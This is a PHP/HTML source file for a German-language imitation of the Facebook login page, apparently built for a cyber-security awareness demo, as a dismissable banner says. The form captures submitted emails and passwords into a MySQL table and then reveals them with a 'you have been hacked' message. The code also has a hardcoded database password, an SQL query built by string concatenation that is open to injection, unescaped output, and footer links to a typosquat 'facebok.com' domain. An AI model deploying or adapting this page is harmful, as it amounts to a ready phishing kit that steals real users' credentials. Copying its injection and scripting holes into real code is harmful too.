<!DOCTYPE html>
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Facebook - Anmelden oder Registrieren</title>
    <link rel="icon" href="favicon.png" sizes="48x48" type="image/png"/>
    <link rel="stylesheet" href="style.css"/>
</head>
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") : ?>
<?php
    $conn = new mysqli("localhost","letshack","LetsH4ck!","cyberdemo");
    if ($conn->connect_error) {
        echo($conn->connect_error);
    }
    $sql="INSERT INTO logindata (email, password) VALUES ('".$_POST["email"]."', '".$_POST["pwd"]."')";
    $result=$conn->query($sql);
?>
<body>
    <div class="background">
        <div class="hack-container">
            <h2>Sie wurden soeben gehackt!</h2>
            <p>Benutzername: <?php echo($_POST["email"])?><br />Passwort: <?php echo($_POST["pwd"])?></p>
        </div>
    </div>
</body>
<?php else : ?>
<body>
    <div class="container">
        <div class="logo-and-text">
            <img src="facebook-logo.png">
            <h2>Auf Facebook bleibst du mit Menschen in Verbindung und teilst Fotos, Videos und vieles mehr mit ihnen.</h2>
        </div>
        <div class="login-container">
            <div class="login-form">
                <form name="login" action="/" method="post">
                    <input type="text" name="email" class="email" placeholder="E-Mail-Adresse oder Telefonnummer">
                    <input type="password" name="pwd" class="pwd" placeholder="Passwort">
                    <input type="submit" value="Anmelden" class="login"/>
                </form>
                <p><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMxMTMxMjMyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D">Passwort vergessen?</a></p>
                <div class="line"></div>
                <a href="https://www.facebook.com/#"><button class="create-account">Neues Konto erstellen</button></a>
            </div>
            <p class="new-account"><a href="https://www.facebook.com/pages/create/?ref_type=registration_form"><strong>Erstelle eine Seite</strong></a> für einen Star, eine Band oder ein Unternehmen.</p>
        </div>
        <div class="clear"> </div>
    </div>
    <div class="footer-container">
        <div class="footer">
            <p>
                Deutsch
                <a href="https://fr-fr.facebok.com">Français (France)</a>
                <a href="https://www.facebok.com">English (US)</a>
                <a href="https://it-it.facebok.com">Italiano</a>
                <a href="https://pt-pt.facebok.com">Português (Portugal)</a>
                <a href="https://sq-al.facebok.com">Shqip</a>
                <a href="https://es-la.facebok.com">Español</a>
                <a href="https://tr-tr.facebok.com">Türkçe</a>
            </p>
            <div class="footer-line"></div>
            <p>
                <a href="https://www.facebook.com/r.php" class="no-indent">Registrieren</a>
                <a href="https://www.facebook.com/login/">Anmelden</a>
                <a href="https://messenger.com/">Messenger</a>
                <a href="https://www.facebook.com/lite/">Facebook Lite</a>
                <a href="https://www.facebook.com/watch/">Watch</a>
                <a href="https://www.facebook.com/places/">Orte</a>
                <a href="https://www.facebook.com/games/">Spiele</a>
                <a href="https://www.facebook.com/marketplace/">Marketplace</a>
                <a href="https://pay.facebook.com/">Facebook Pay</a>
                <a href="https://www.facebook.com/jobs/">Jobs</a>
                <a href="https://www.oculus.com/">Oculus</a>
                <a href="https://portal.facebook.com/">Portal</a>
                <a href="https://www.instagram.com/">Instagram</a>
                <a href="https://www.facebook.com/local/lists/245019872666104/">Lokales</a>
                <a href="https://www.facebook.com/fundraisers/">Spendenaktionen</a>
                <a href="https://www.facebook.com/biz/directory/">Services</a>
                <a href="https://www.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D">Wahl-Informationszentrum</a>
                <a href="https://about.facebook.com/">Info</a>
                <a href="https://www.facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto">Werbeanzeige erstellen</a>
                <a href="https://www.facebook.com/pages/create/?ref_type=site_footer">Seite erstellen</a>
                <a href="https://developers.facebook.com/?ref=pf">Entwickler</a>
                <a href="https://www.facebook.com/careers/?ref=pf">Karriere</a>
                <a href="https://www.facebook.com/privacy/explanation">Privatsphäre</a>
                <a href="https://www.facebook.com/policies/cookies/">Cookies</a>
                <a href="https://www.facebook.com/help/568137493302217">Datenschutzinfo</a>
                <a href="https://www.facebook.com/policies?ref=pf">Nutzungsbedingungen</a>
                <a href="https://www.facebook.com/help/?ref=pf">Hilfe</a>
            </p>
            <p class="copyright">Facebook &copy; 2021</p>
        </div>
    </div>
    <div class="cookie-container">
        <div class="cookie">
            <p class="close">X</p>
            <p>Diese Webseite ist Teil einer Cyber-Demo. Verwenden Sie keine echten Logindaten!</p>
        </div>
    </div>
</body>
<script>
    const close = document.querySelector(".close");
    close.addEventListener('click', ()=> {
        const cookie = document.querySelector(".cookie");
        cookie.classList.toggle("disappear");
    });
</script>
<?php endif; ?>
</html>
